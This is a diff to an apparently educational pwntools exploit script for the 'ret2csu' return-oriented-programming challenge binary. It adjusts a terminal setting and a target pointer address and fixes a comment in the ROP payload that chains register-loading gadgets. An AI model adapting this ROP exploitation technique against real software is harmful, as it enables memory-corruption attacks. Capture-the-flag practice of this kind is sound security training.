@@ -10,6 +10,14 @@ exe = context.binary = ELF(args.EXE or "./ret2csu")
 lib = ELF("./libret2csu.so")
 context.delete_corefiles = True
 context.terminal = ["alacritty", "-e", "sh", "-c"]
+context.terminal = [
+    "wt.exe",
+    "-w",
+    "0",
+    "nt",
+    "wsl.exe",
+    "--",
+]  # windows/wsl/windows-terminal
 rop = ROP(exe)
 # context.log_level = "debug"
 
@@ -76,7 +84,7 @@ csu_mov = 0x400680
 # mov rsi,r14
 # mov edi,r13d
 # call QWORD PTR [r12+rbx*8]
-fini_ref = 0x6003B0
+fini_ref = 0x600E48
 # fant med "find 0x600000, 0x601000, 0x00000000004006b4" i gdb
 # kjør info proc mappings for å se memory mappings
 
@@ -87,7 +95,7 @@ payload = flat(
     asm("nop") * offset,
     pop_rbx_rbp_r12_r13_r14_r15,
     -0x1,  # rbx
-    0x0,  # rb)p
+    0x0,  # rbp
     fini_ref + 8,  # r12 -> calles
     args[0],  # r13 -> edi
     args[1],  # r14 -> rsi
